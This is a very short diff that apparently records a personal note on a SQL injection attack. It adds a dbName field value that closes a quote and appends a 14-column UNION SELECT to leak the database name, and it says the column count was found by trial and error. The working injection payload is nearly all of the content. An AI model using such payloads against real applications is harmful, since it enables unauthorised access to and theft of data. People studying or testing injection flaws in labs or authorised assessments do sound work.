@@ -1,0 +1,3 @@
+[dbName] abcd' union select 'aaa',database(),'aaa','bbb','ccc','ddd','eee','fff','ggg','hhh','iii','hhh','jjj', 'kkk'#Comment
+I figured out there are 14 fields in query by hit and trial, in injection.  
+
